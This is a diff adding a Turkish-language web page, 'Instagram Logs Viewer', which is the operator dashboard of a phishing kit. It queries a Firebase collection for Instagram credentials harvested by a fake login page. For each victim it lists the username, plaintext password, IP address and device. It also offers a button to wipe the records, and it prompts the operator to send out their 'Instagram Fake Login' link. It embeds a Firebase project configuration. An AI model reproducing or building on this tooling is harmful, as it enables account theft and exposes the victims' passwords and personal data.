@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>⛧ INSTAGRAM LOGS VIEWER ⛧</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0c15;
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            padding: 16px;
+            min-height: 100vh;
+            color: #ccc;
+        }
+        .container { max-width: 800px; margin: 0 auto; }
+        
+        .header {
+            background: #0f111a;
+            border: 2px solid #ff3366;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .header h1 { color: #ff3366; font-size: 1.5rem; text-shadow: 0 0 10px #ff3366; letter-spacing: 2px; }
+        .header h1 span { color: #00ff41; }
+        .header p { color: #888; font-size: 0.7rem; margin-top: 8px; }
+        
+        .stats-box {
+            background: #0f111a;
+            border: 1px solid #2a2e44;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .stat-item { text-align: center; }
+        .stat-item .number { color: #00ff41; font-size: 1.8rem; font-weight: bold; }
+        .stat-item .label { color: #888; font-size: 0.6rem; letter-spacing: 1px; }
+        
+        .card {
+            background: #0f111a;
+            border: 1px solid #2a2e44;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+        .card:hover { border-color: #ff3366; }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #2a2e44;
+        }
+        .username { color: #00ff41; font-size: 1rem; font-weight: bold; }
+        .timestamp { color: #888; font-size: 0.65rem; }
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            font-size: 0.7rem;
+            color: #aaa;
+        }
+        .detail-row .value { color: #fff; font-weight: bold; word-break: break-all; }
+        
+        .loading { text-align: center; color: #00ff41; padding: 40px; font-size: 0.9rem; }
+        .no-data { text-align: center; color: #ff3366; padding: 40px; font-size: 0.9rem; }
+        .error-msg { text-align: center; color: #ff0040; padding: 40px; font-size: 0.9rem; }
+        
+        .btn-group { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 20px; }
+        .btn {
+            background: transparent;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 10px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 0.75rem;
+            transition: 0.2s;
+        }
+        .btn:hover { background: #00ff41; color: #000; }
+        .btn-danger { border-color: #ff3366; color: #ff3366; }
+        .btn-danger:hover { background: #ff3366; color: #fff; }
+
+        @media (max-width: 500px) {
+            .header h1 { font-size: 1.1rem; }
+            .card { padding: 12px; }
+            .detail-row { font-size: 0.6rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⛧ <span>INSTAGRAM</span> LOGS VIEWER ⛧</h1>
+            <p id="headerUid">UID: Yükleniyor...</p>
+        </div>
+        
+        <div class="stats-box">
+            <div class="stat-item">
+                <div class="number" id="totalLogs">0</div>
+                <div class="label">TOPLAM LOG</div>
+            </div>
+            <div class="stat-item">
+                <div class="number" id="uniqueUsers">0</div>
+                <div class="label">FARKLI KULLANICI</div>
+            </div>
+            <div class="stat-item">
+                <div class="number" id="lastLog">⛧</div>
+                <div class="label">SON LOG</div>
+            </div>
+        </div>
+        
+        <div class="btn-group">
+            <button class="btn" id="refreshBtn">⟳ YENİLE</button>
+            <button class="btn btn-danger" id="clearBtn">🗑 TÜMÜNÜ SİL</button>
+        </div>
+        
+        <div id="content">
+            <div class="loading">⟳ YÜKLENİYOR...</div>
+        </div>
+    </div>
+
+    <script type="importmap">
+        {
+            "imports": {
+                "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+                "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
+            }
+        }
+    </script>
+
+    <script type="module">
+        import { initializeApp } from "firebase/app";
+        import { getFirestore, collection, query, where, getDocs, deleteDoc, doc, orderBy } from "firebase/firestore";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
+            authDomain: "camerahhh-15487.firebaseapp.com",
+            projectId: "camerahhh-15487",
+            storageBucket: "camerahhh-15487.firebasestorage.app",
+            messagingSenderId: "212849652224",
+            appId: "1:212849652224:web:19d8a85c01cd81005bdee5",
+            measurementId: "G-WDVJV36W7X"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const params = new URLSearchParams(window.location.search);
+        const userId = params.get('uid');
+
+        if (!userId) {
+            document.getElementById('content').innerHTML = `<div class="error-msg">⛧ UID PARAMETRESİ EKSİK! ⛧<br><small>Link: ?uid=KULLANICI_ID</small></div>`;
+            throw new Error('UID eksik');
+        }
+
+        document.getElementById('headerUid').innerHTML = `UID: <span style="color:#00ff41;">${userId}</span>`;
+
+        async function loadLogs() {
+            const contentDiv = document.getElementById('content');
+            contentDiv.innerHTML = `<div class="loading">⟳ YÜKLENİYOR...</div>`;
+
+            try {
+                const q = query(
+                    collection(db, "ig_accounts"),
+                    where("ownerId", "==", userId),
+                    orderBy("timestamp", "desc")
+                );
+                
+                const snapshot = await getDocs(q);
+                const logs = [];
+                
+                snapshot.forEach(docSnap => {
+                    logs.push({ id: docSnap.id, ...docSnap.data() });
+                });
+
+                document.getElementById('totalLogs').innerText = logs.length;
+                
+                const uniqueUsernames = [...new Set(logs.map(l => l.username).filter(Boolean))];
+                document.getElementById('uniqueUsers').innerText = uniqueUsernames.length;
+                
+                if (logs.length > 0) {
+                    const lastDate = new Date(logs[0].timestamp);
+                    document.getElementById('lastLog').innerHTML = lastDate.toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });
+                }
+
+                if (logs.length === 0) {
+                    contentDiv.innerHTML = `<div class="no-data">⛧ HENÜZ LOG YOK ⛧<br><small>Instagram Fake Login linkinizi gönderin</small></div>`;
+                    return;
+                }
+
+                let html = '';
+                for (const log of logs) {
+                    const date = new Date(log.timestamp);
+                    html += `
+                        <div class="card">
+                            <div class="card-header">
+                                <span class="username">👤 ${log.username || 'N/A'}</span>
+                                <span class="timestamp">⛧ ${date.toLocaleString('tr-TR')}</span>
+                            </div>
+                            <div class="detail-row">
+                                <span>🔑 Şifre:</span>
+                                <span class="value">${log.password || 'N/A'}</span>
+                            </div>
+                            <div class="detail-row">
+                                <span>🌐 IP:</span>
+                                <span class="value">${log.ip || 'N/A'}</span>
+                            </div>
+                            <div class="detail-row">
+                                <span>📱 Cihaz:</span>
+                                <span class="value">${(log.userAgent || 'N/A').substring(0, 80)}</span>
+                            </div>
+                        </div>
+                    `;
+                }
+                contentDiv.innerHTML = html;
+
+            } catch (err) {
+                console.error('Firestore hatası:', err);
+                contentDiv.innerHTML = `<div class="error-msg">❌ HATA: ${err.message}<br><small>Firebase bağlantısını kontrol edin</small></div>`;
+            }
+        }
+
+        async function clearAllLogs() {
+            if (!confirm('TÜM LOGLARI SİLMEK İSTEDİĞİNİZE EMİN MİSİNİZ?\nBu işlem geri alınamaz!')) return;
+
+            const contentDiv = document.getElementById('content');
+            contentDiv.innerHTML = `<div class="loading">⟳ SİLİNİYOR...</div>`;
+
+            try {
+                const q = query(
+                    collection(db, "ig_accounts"),
+                    where("ownerId", "==", userId)
+                );
+                const snapshot = await getDocs(q);
+                
+                const deletePromises = [];
+                snapshot.forEach(docSnap => {
+                    deletePromises.push(deleteDoc(doc(db, "ig_accounts", docSnap.id)));
+                });
+                
+                await Promise.all(deletePromises);
+                await loadLogs();
+            } catch (err) {
+                contentDiv.innerHTML = `<div class="error-msg">❌ SİLME HATASI: ${err.message}</div>`;
+            }
+        }
+
+        document.getElementById('refreshBtn').addEventListener('click', loadLogs);
+        document.getElementById('clearBtn').addEventListener('click', clearAllLogs);
+
+        loadLogs();
+    </script>
+</body>
+</html>
